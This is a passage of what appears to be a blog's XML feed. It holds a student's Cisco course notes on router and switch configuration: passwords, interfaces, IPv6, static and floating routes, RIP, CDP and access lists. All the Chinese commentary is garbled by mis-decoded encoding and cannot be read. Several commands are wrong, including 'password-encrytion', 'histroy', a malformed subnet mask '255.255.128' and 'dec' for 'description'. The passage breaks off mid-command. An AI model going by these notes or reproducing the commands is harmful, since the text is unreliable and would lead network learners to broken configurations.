ä¸ºè·¨åŸŸ</p><p>è·¨è¶Šå®šä¹‰ :ç”±äºæµè§ˆå™¨åŒæºç­–ç•¥ï¼Œå‡¡æ˜¯å‘é€è¯·æ±‚çš„urlçš„åè®®(httpå’Œhttps)ã€åŸŸåï¼ˆ<a href="http://www.example.com,about.example.comï¼‰ã€ç«¯å£(8010å’Œ8020)ä¸‰è€…ä¹‹é—´ä»»æ„ä¸€ä¸ªä¸å½“å‰é¡µé¢åœ°å€ä¸åŒåˆ™è§†ä¸ºè·¨åŸŸã€‚">www.example.com,about.example.comï¼‰ã€ç«¯å£(8010å’Œ8020)ä¸‰è€…ä¹‹é—´ä»»æ„ä¸€ä¸ªä¸å½“å‰é¡µé¢åœ°å€ä¸åŒåˆ™è§†ä¸ºè·¨åŸŸã€‚</a></p><p><a href="https://www.cnblogs.com/randomlee/p/9752705.html">https://www.cnblogs.com/randomlee/p/9752705.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscoè¯¾ç¨‹ä»£ç è®°å½•</title>
    <link href="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><strong>ä¸è®°è‚¯å®šä¼šå¿˜è®°QAQ,åªæ•²ç®€å†™ç„¶åæ•²tabä¹Ÿæ˜¯å¯ä»¥çš„</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">enable<br>configure terminal<br>hostname R1<br></code></pre></td></tr></table></figure><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">enable password xxx <span class="hljs-comment"># è®¾ç½®ç”¨æˆ·æ‰§è¡Œå¯†ç </span><br>enable secret class <span class="hljs-comment"># è®¾ç½®ç‰¹æƒæ‰§è¡Œå¯†ç </span><br>line console <span class="hljs-number">0</span> <span class="hljs-comment">#çº¿è·¯å¯†ç </span><br>(config-line)password cisco<br>(config-line)login<br>(config-line)<span class="hljs-keyword">exit</span><br>line vty <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-comment">#åŠ å¯†å¯†ç è®¾ç½®</span><br>(config-line)password class<br>(config-line)login<br>(config-line)<span class="hljs-keyword">exit</span><br>service password-encrytion <span class="hljs-comment">#åŠ å¯†çº¯æ–‡æœ¬å¯†ç </span><br></code></pre></td></tr></table></figure><h2 id="æ ‡è¯­"><a href="#æ ‡è¯­" class="headerlink" title="æ ‡è¯­"></a>æ ‡è¯­</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">banner motd <span class="hljs-symbol">$</span> (<span class="hljs-symbol">$</span>æ˜¯æˆªæ­¢ç¬¦å·)<br>banner motd <span class="hljs-symbol">$</span> Authorized Access Only! <span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h2 id="ä¿å­˜é…ç½®"><a href="#ä¿å­˜é…ç½®" class="headerlink" title="ä¿å­˜é…ç½®"></a>ä¿å­˜é…ç½®</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">copy running-config startup-config<br></code></pre></td></tr></table></figure><h2 id="ç«¯å£è®¾ç½®"><a href="#ç«¯å£è®¾ç½®" class="headerlink" title="ç«¯å£è®¾ç½®"></a>ç«¯å£è®¾ç½®</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">interface f <span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>(config-<span class="hljs-keyword">if</span>)description Link to Lan <span class="hljs-number">1</span><br>(config-<span class="hljs-keyword">if</span>)ip address <span class="hljs-number">192.168</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> <br>(config-<span class="hljs-keyword">if</span>)ipv6 address <span class="hljs-number">2001</span>:db8:acad:<span class="hljs-number">1</span>::<span class="hljs-number">1</span>/<span class="hljs-number">64</span> <span class="hljs-comment">#IPV6</span><br>(config-<span class="hljs-keyword">if</span>)no shutdown<br>(config-<span class="hljs-keyword">if</span>)<span class="hljs-keyword">exit</span><br><br><span class="hljs-comment">#Serialå£ ä½œä¸ºDCE è¦é™„åŠ ä¸Š</span><br>(config-<span class="hljs-keyword">if</span>)clock rate <span class="hljs-number">128000</span><br><br><span class="hljs-comment">#Loopbackç¯å›æ¥å£</span><br>interface loopback <span class="hljs-number">0</span><br>(config-<span class="hljs-keyword">if</span>)ip address <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>(config-<span class="hljs-keyword">if</span>)<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">show ip <span class="hljs-keyword">interface</span> <span class="hljs-symbol">brief</span><br><span class="hljs-symbol">show</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">ipv6</span> <span class="hljs-symbol">brief</span><br><span class="hljs-symbol">show</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">route</span><br><br></code></pre></td></tr></table></figure><h2 id="å†å²è®°å½•"><a href="#å†å²è®°å½•" class="headerlink" title="å†å²è®°å½•"></a>å†å²è®°å½•</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">terminal</span> histroy size <span class="hljs-number">200</span><br><span class="hljs-built_in">show</span> history<br></code></pre></td></tr></table></figure><blockquote><p>IPv6 åœ°å€è§£æä¸ä½¿ç”¨ ARP è¿›ç¨‹ï¼Œè€Œæ˜¯ä½¿ç”¨ ICMPv6 é‚»å±…è¯·æ±‚å’Œé‚»å±…é€šå‘Šæ¶ˆæ¯ã€‚IPv6 åˆ° MAC åœ°å€çš„æ˜ å°„ä¿å­˜åœ¨ä¸€ä¸ªç±»ä¼¼äº ARP ç¼“å­˜çš„è¡¨ä¸­ï¼Œç§°ä¸ºé‚»å±…ç¼“å­˜ã€‚</p><p>ä»£ç å­—æ¯ D ç”¨äºæ ‡è¯†é€šè¿‡ EIGRP è·çŸ¥çš„è·¯ç”±ã€‚</p><p>â€œæœ€åé€‰ç”¨ç½‘å…³â€æ˜¯å¦ä¸€å°è·¯ç”±å™¨çš„ipåœ°å€</p><p>é»˜è®¤é™æ€è·¯ç”±ç”¨ä½œæœ€åé€‰ç”¨ç½‘å…³</p><p><strong>S 10.2.0.0 [1/0] via 172.16.2.2</strong> ä¸­ï¼Œæ–¹æ‹¬å·å†…çš„æ•°å­—åˆ†åˆ«è¡¨ç¤ºç®¡ç†è·ç¦»å’Œåº¦é‡ã€‚</p><p>ROM åŒ…å«åœ¨ç¡¬ä»¶æ¨¡å—ä¸Šæ‰§è¡Œçš„è¯Šæ–­æ“ä½œ</p><p>é»˜è®¤é™æ€è·¯ç”±çš„ IPv6 åœ°å€å’Œå‰ç¼€ä¸º ::/0ã€‚è¿™è¡¨ç¤ºåœ°å€ä¸­çš„æ‰€æœ‰é›¶å’Œå‰ç¼€é•¿åº¦é›¶</p></blockquote><h2 id="ä½¿ç”¨rip"><a href="#ä½¿ç”¨rip" class="headerlink" title="ä½¿ç”¨rip"></a>ä½¿ç”¨rip</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">router</span> rip<br>network ç½‘æ®µ<br></code></pre></td></tr></table></figure><h2 id="access-list"><a href="#access-list" class="headerlink" title="access-list"></a>access-list</h2><p>ç¦æ­¢è®¿é—®</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(config)<span class="hljs-meta">#access-list 1 deny host 24.17.2.18</span><br>(config)<span class="hljs-meta">#interface f0/0</span><br>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta">#ip access-group 1 in</span><br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(config)<span class="hljs-meta">#access-list 1 permit any</span><br></code></pre></td></tr></table></figure><p>permit anything from the subnet 24.17.2.0. Access-list 102 permit IP 24.17.2.0 0.0.0.15 any log</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router1</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">102</span> permit ip <span class="hljs-number">24.17</span>.<span class="hljs-number">2.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.15</span> any log<br></code></pre></td></tr></table></figure><p>allow telnet from 24.17.2.16</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(config)<span class="hljs-meta">#access-list 101 permit tcp 24.17.2.16 0.0.0.15 any eq telnet</span><br></code></pre></td></tr></table></figure><h2 id="1-1-3-5-Configuring-IPv4-and-IPv6-Interfaces"><a href="#1-1-3-5-Configuring-IPv4-and-IPv6-Interfaces" class="headerlink" title="1.1.3.5  Configuring IPv4 and IPv6 Interfaces"></a>1.1.3.5  Configuring IPv4 and IPv6 Interfaces</h2><p>R1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">cisco<br>enable<br>class<br>config t<br>interf g0/<span class="hljs-number">0</span><br>ip add <span class="hljs-number">172.16</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.128</span><br>no shutdown<br><span class="hljs-keyword">exit</span><br>interf g0/<span class="hljs-number">1</span><br>ip add <span class="hljs-number">172.16</span>.<span class="hljs-number">20.129</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">128</span><br>no shutdown <br><span class="hljs-keyword">exit</span><br><br></code></pre></td></tr></table></figure><p>R2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cisco</span><br><span class="hljs-attribute">enable</span><br><span class="hljs-attribute">class</span><br><span class="hljs-attribute">config</span> t<br><span class="hljs-attribute">interf</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ipv6</span> add <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">12</span>::<span class="hljs-number">1</span>/<span class="hljs-number">64</span><br><span class="hljs-attribute">ipv6</span> address FE<span class="hljs-number">80</span>::<span class="hljs-number">2</span> link-local<br><span class="hljs-attribute">no</span> shutdown<br><span class="hljs-attribute">interf</span> g<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ipv6</span> add <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">13</span>::<span class="hljs-number">1</span>/<span class="hljs-number">64</span><br><span class="hljs-attribute">ipv6</span> address FE<span class="hljs-number">80</span>::<span class="hljs-number">2</span> link-local<br><span class="hljs-attribute">no</span> shutdown<br><span class="hljs-attribute">ex</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> <span class="hljs-number">172.16.20.1</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">172.16.20.129</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">64.100.1.10</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">12</span>::<span class="hljs-number">1</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">13</span>::<span class="hljs-number">1</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">100</span>:<span class="hljs-number">1</span>::A<br></code></pre></td></tr></table></figure><h2 id="1-1-4-5-Configuring-and-Verifying-a-Small-Network"><a href="#1-1-4-5-Configuring-and-Verifying-a-Small-Network" class="headerlink" title="1.1.4.5 Configuring and Verifying a Small Network"></a>1.1.4.5 Configuring and Verifying a Small Network</h2><p>RTA</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">enable secret class<br>line console <span class="hljs-number">0</span><br>password cisco<br>login<br><span class="hljs-keyword">exit</span><br>line vty <span class="hljs-number">0</span><br>password class<br>login<br><span class="hljs-keyword">exit</span><br>service password-encrytion<br><br>interf g0/<span class="hljs-number">0</span> <br>ip add <span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>des pc1<br>no shutdown<br>ex<br>interf g0/<span class="hljs-number">1</span><br>ip add <span class="hljs-number">10.10</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>dec pc2<br>no shutdown<br>ex<br><br>copy running-config startup-config<br></code></pre></td></tr></table></figure><p>SW1</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">int</span> vlan1<br>ip add <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>no shutdown<br>ex<br>ip <span class="hljs-keyword">default</span>-gateway <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span><br>copy running-config startup-config<br></code></pre></td></tr></table></figure><p>SW2</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">int</span> vlan1<br>ip add <span class="hljs-number">10.10.20.2</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-literal">no</span> shutdown<br>ex<br>ip default-gateway <span class="hljs-number">10.10.20.1</span><br></code></pre></td></tr></table></figure><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200225132814418.png" class="" title="image-20200225132814418"><h2 id="1-3-2-5-Investigating-Directly-Connected-Routes"><a href="#1-3-2-5-Investigating-Directly-Connected-Routes" class="headerlink" title="1.3.2.5 Investigating Directly Connected Routes"></a>1.3.2.5 Investigating Directly Connected Routes</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227092952674.png" class="" title="image-20200227092952674"><p>PC1å¯pingé€šPC2å’ŒPC3</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093406101.png" class="" title="image-20200227093406101"><p>PC3å¯pingé€šPC4</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093322437.png" class="" title="image-20200227093322437"><p>show ip route static æŸ¥çœ‹é™æ€è·¯ç”±è½¬å‘</p><p>v4å¯é€šï¼Œv6ä¸é€š</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227100354728.png" class="" title="image-20200227100354728"><p>æ‰‹åŠ¨æ§åˆ¶å‡ºå£ç«¯å£ååˆå¯é€šï¼Œå¹¶ä¸”æŸ¥çœ‹è·¯ç”±è¡¨ä¹‹åï¼Œå‘ç°æ²¡æœ‰FEçš„ï¼Œéƒ½æ˜¯2001çš„ï¼Œè¯´æ˜æ˜¯è·¯ç”±è®¾ç½®çš„é—®é¢˜</p><hr><h2 id="lab1-amp-2-27ç¬”è®°"><a href="#lab1-amp-2-27ç¬”è®°" class="headerlink" title="lab1&amp;2.27ç¬”è®°"></a>lab1&amp;2.27ç¬”è®°</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227082933206.png" class="" title="image-20200227082933206"><p>ç‚¹è¿™é‡Œå…³æœºï¼Œç„¶åæ‹–å…¥æ¨¡å—</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/IAEW4JL%60HJEWNF6@I%5BUD1T2.png" class="" title="img"><p>è¿™ä¸ªæ¨¡å—æ˜¯æœ‰serialå£çš„</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227083957606.png" class="" title="image-20200227083957606"><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">config <span class="hljs-built_in">t</span><br>no ip domain-<span class="hljs-built_in">lookup</span><br></code></pre></td></tr></table></figure><blockquote><p>router&gt; æ˜¯å¤„äºç”¨æˆ·æ¨¡å¼</p><p>router# æ˜¯å¤„äºç‰¹æƒæ¨¡å¼ åœ¨ç”¨æˆ·ç•Œé¢ä½¿ç”¨enableå¯ç”¨</p><p>show hosts æ˜¾ç¤ºåˆ†é…äº†ä¸»æœºåçš„ipåœ°å€</p><p>è®¾ç½®è¿œç¨‹ç™»å½•</p><p>(config)line vty 0 4#è™šæ‹Ÿç»ˆç«¯</p><p>(config-line)password 123</p><p>(config-line)login #å…è®¸è¿œç¨‹ç™»å½•</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227085924224.png" class="" title="image-20200227085924224"><p>enable secret æƒé™æ›´é«˜ï¼Œå¯è¦†ç›–enable password</p></blockquote><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> <span class="hljs-built_in">s0</span>/<span class="hljs-number">1</span><br><span class="hljs-symbol">enable</span> <span class="hljs-keyword">cdp</span> <br><span class="hljs-symbol">no</span> shut<br><span class="hljs-symbol">ex</span><br><span class="hljs-keyword">cdp</span> run<br></code></pre></td></tr></table></figure><blockquote><p>ç«¯å£ä¸‹ cdp enable</p></blockquote><h2 id="3-3ç¬”è®°"><a href="#3-3ç¬”è®°" class="headerlink" title="3/3ç¬”è®°"></a>3/3ç¬”è®°</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303101529289.png" class="" title="image-20200303101529289"><p>æµ®åŠ¨é™æ€è·¯ç”±å™¨ï¼š</p><ul><li>å¤‡ä»½åŠ¨æ€è·¯ç”±åè®®å·²å‘ç°çš„è·¯ç”±</li><li>ç›¸æ¯”åŸåŠ¨æ€è·¯ç”±åè®®ï¼Œé…ç½®çš„ç®¡ç†è·ç¦»æ›´é•¿</li></ul><h3 id="é™æ€è·¯ç”±"><a href="#é™æ€è·¯ç”±" class="headerlink" title="é™æ€è·¯ç”±"></a>é™æ€è·¯ç”±</h3><p>ip route ç½‘æ®µ æ©ç  ä¸‹ä¸€è·³ç«¯å£ip</p><p>ip route 172.16.1.0 255.255.255.0 172.16.2.2</p><p>ipv6 route 2001:DB8:ACAD:3::/64 2001:DB8:ACAD:4::2</p><h3 id="å®Œå…¨æŒ‡å®šé™æ€è·¯ç”±"><a href="#å®Œå…¨æŒ‡å®šé™æ€è·¯ç”±" class="headerlink" title="å®Œå…¨æŒ‡å®šé™æ€è·¯ç”±"></a>å®Œå…¨æŒ‡å®šé™æ€è·¯ç”±</h3><p>ip route ç½‘æ®µ æ©ç  ç«¯å£</p><p>R1(config)# ip route 192.168.2.0 255.255.255.0 GigabitEthernet 0/1</p><p><strong>å¦‚æœ IPv6 é™æ€è·¯ç”±ä½¿ç”¨ IPv6 æœ¬åœ°é“¾è·¯åœ°å€ä½œä¸ºä¸‹ä¸€è·³åœ°å€ï¼Œåˆ™å¿…é¡»ä½¿ç”¨å®Œå…¨æŒ‡å®šé™æ€è·¯ç”±ï¼ˆåŒ…å«é€å‡ºæ¥å£ï¼‰</strong></p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200421091844171.png" class="" title="image-20200421091844171"><h3 id="é»˜è®¤é™æ€è·¯ç”±"><a href="#é»˜è®¤é™æ€è·¯ç”±" class="headerlink" title="é»˜è®¤é™æ€è·¯ç”±"></a>é»˜è®¤é™æ€è·¯ç”±</h3><p>ip route 0.0.0.0 0.0.0.0 172.168.2.2</p><p>ipv6 route ::/0 2001:DB8:ACAD:4::2</p><h3 id="æµ®åŠ¨é™æ€è·¯ç”±"><a href="#æµ®åŠ¨é™æ€è·¯ç”±" class="headerlink" title="!!! æµ®åŠ¨é™æ€è·¯ç”±"></a>!!! æµ®åŠ¨é™æ€è·¯ç”±</h3><p>ip route 0.0.0.0 0.0.0.0 172.16.2.2 # é»˜è®¤é™æ€è·¯ç”±</p><p>ipv6 route ::/0 ipv6_add </p><p>ip route 0.0.0.0 0.0.0.0 10.10.10.2 5 # ç®¡ç†è·ç¦»ä¸º5</p><p>ipv6 route ::/0 ipv6_add  5</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303110803109.png" class="" title="image-20200303110803109"><h2 id="2-2-4-4-Configuring-IPv6-Static-and-Default-Routes"><a href="#2-2-4-4-Configuring-IPv6-Static-and-Default-Routes" class="headerlink" title="2.2.4.4 Configuring IPv6 Static and Default Routes"></a>2.2.4.4 Configuring IPv6 Static and Default Routes</h2><p>R1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipv6</span> unicast-routing<br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">2</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">2</span> # é€’å½’é™æ€è·¯ç”±<br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">3</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">2</span><br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">002</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>R2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipv6</span> unicast-routing<br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">001</span>::<span class="hljs-number">1</span><br><span class="hljs-attribute">ipv6</span> route <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:<span class="hljs-number">3</span>::/<span class="hljs-number">64</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">002</span>::<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>R3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipv6</span> unicast-routing<br><span class="hljs-attribute">IPV6</span> ROUTE ::/<span class="hljs-number">0</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">1</span>:A<span class="hljs-number">002</span>::<span class="hljs-number">1</span> # é»˜è®¤è·¯ç”±<br></code></pre></td></tr></table></figure><h2 id="2-2-5-5-Configuring-Floating-Static-Routes"><a href="#2-2-5-5-Configuring-Floating-Static-Routes" class="headerlink" title="2.2.5.5 Configuring Floating Static Routes"></a>2.2.5.5 Configuring Floating Static Routes</h2><p>Edge</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">ipv6</span> route ::/<span class="hljs-number">0</span> s<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ipv6</span> route ::/<span class="hljs-number">0</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:A:<span class="hljs-number">2</span>::<span class="hljs-number">1</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="2-3-2-3"><a href="#2-3-2-3" class="headerlink" title="2.3.2.3"></a>2.3.2.3</h2><p>R2</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ip</span> route <span class="hljs-number">172.31.1.128</span> <span class="hljs-number">255.255.255.192</span> <span class="hljs-number">172.31.1.198</span><br><span class="hljs-literal">no</span> ip route <span class="hljs-number">172.31.1.128</span> <span 